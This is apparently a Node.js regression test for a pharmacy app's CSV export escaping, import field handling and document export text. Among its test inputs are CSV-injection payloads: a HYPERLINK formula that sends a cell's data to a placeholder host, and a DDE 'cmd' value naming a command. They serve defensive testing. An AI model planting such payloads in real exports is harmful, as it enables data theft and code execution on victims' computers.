// NevOut Meds — final security audit regressions (no browser, no DB).
//
//   * CSV exports neutralise spreadsheet formulas and cannot break out of a cell
//     (before: names starting with "=" were exported verbatim; the documents
//     index did not escape inner quotes).
//   * "Update existing" imports never reset optional fields the file does not
//     contain (before: a minimal products/customers file zeroed reorder points
//     and credit limits of existing records).
//   * A document with no stored file is exported as its details, never with a
//     placeholder claiming a real file exists.
//
// Usage: node supabase/tests/export_import_safety.test.mjs
import { build } from "esbuild";
import { join, dirname } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..", "..");
const OUT = join(ROOT, "node_modules/.cache/nv-audit-test");
async function load(entry, name) {
  const outfile = join(OUT, `${name}.mjs`);
  await build({
    entryPoints: [join(ROOT, entry)], bundle: true, format: "esm", platform: "neutral", outfile, logLevel: "error",
    alias: { "@": join(ROOT, "client/src") }, external: ["react", "react/jsx-runtime"], jsx: "automatic"
  });
  return import(pathToFileURL(outfile).href);
}

const { csvCell, toCsv } = await load("client/src/platform/utils/csv.ts", "csv");
const { buildProducts, buildCustomers } = await load("client/src/platform/import/rows.ts", "rows");
const { buildDocumentExportText, buildDocumentsIndexCsv } = await load("client/src/platform/features/documents/exports.ts", "docexports");

let n = 0, failed = 0;
const check = (d, ok, detail = "") => { n++; if (!ok) failed++; console.log(`${ok ? "ok" : "not ok"} ${n} - ${d}${detail ? ` [${detail}]` : ""}`); };

// ── CSV ──────────────────────────────────────────────────────────────────────
for (const evil of ['=HYPERLINK("http://x/?"&B2,"click")', "+1+2", "-2+3", "@SUM(A1)", "\t=1", "\r=1"]) {
  const c = csvCell(evil);
  check(`formula-like text is neutralised: ${JSON.stringify(evil).slice(0, 30)}`, c.startsWith(`"'`), c.slice(0, 30));
}
check("inner quotes are doubled inside a quoted cell", csvCell('a"b') === '"a""b"');
check("a quote cannot break out and start a new cell", toCsv([['x",=1+1']]) === '"x"",=1+1"');
check("numbers stay numbers (negative too)", csvCell(-5) === '"-5"' && csvCell("-5.25") === '"-5.25"' && csvCell(12) === '"12"');
check("null/undefined export as empty, not 'undefined'", csvCell(undefined) === '""' && csvCell(null) === '""');
const idx = buildDocumentsIndexCsv([{ name: '=cmd|" /C calc"!A0', category: "license", size: 1, uploadedAt: null, expiryDate: null, tags: [], note: 'He said "hi"' }], [{ id: "license", label: "Licence" }], () => "1 B");
check("documents index CSV is encoded by the shared encoder", idx.includes(`"'=cmd|"" /C calc""!A0"`) && idx.includes('"He said ""hi"""'), idx.split("\r\n")[1]?.slice(0, 60));

// ── Imports ──────────────────────────────────────────────────────────────────
const minimalProducts = buildProducts([{ name: "Paracetamol 500mg", category: "Analgesic", unit_cost: "0.5", selling_price: "1" }], "ph-1");
const p0 = minimalProducts.payload[0] ?? {};
check("products: a file without optional columns sends no optional keys",
  minimalProducts.problems.length === 0 && !("reorder_point" in p0) && !("max_stock" in p0) && !("daily_velocity" in p0) && !("brand" in p0) && !("unit" in p0),
  Object.keys(p0).join(","));
const fullProducts = buildProducts([{ name: "Amoxicillin", category: "Antibiotic", unit_cost: "1", selling_price: "2", reorder_point: "10", brand: "", unit: "caps" }], "ph-1");
const p1 = fullProducts.payload[0] ?? {};
check("products: optional columns present in the file are sent", p1.reorder_point === 10 && p1.unit === "caps" && "brand" in p1 && p1.brand === null, JSON.stringify(p1));
const minimalCustomers = buildCustomers([{ phone: "0770000001", first_name: "Ada", last_name: "A" }], "ph-1", "LR");
const c0 = minimalCustomers.payload[0] ?? {};
check("customers: a file without credit_limit never resets the stored credit limit",
  minimalCustomers.problems.length === 0 && !("credit_limit" in c0) && !("community" in c0), Object.keys(c0).join(","));
const withCredit = buildCustomers([{ phone: "0770000002", first_name: "Bo", last_name: "B", credit_limit: "25" }], "ph-1", "LR");
check("customers: a credit_limit column is still imported", withCredit.payload[0]?.credit_limit === 25);
check("import never sends money fields maintained by the server",
  [...minimalCustomers.payload, ...withCredit.payload].every((c) => !("credit_balance" in c) && !("total_spend" in c)));

// ── Documents ────────────────────────────────────────────────────────────────
const text = buildDocumentExportText({ name: "Licence.pdf", category: "license", uploadedAt: null, uploadedBy: "Owner", expiryDate: null, note: "", tags: [] }, [{ id: "license", label: "Licence" }]);
check("document details export has no development placeholder", !/In production/i.test(text));
check("document details export says no file is stored", /no file stored/i.test(text) && /not a copy of the document/i.test(text));

console.log(`\n# ${n} export/import safety checks, ${failed} failed`);
process.exit(failed ? 1 : 0);
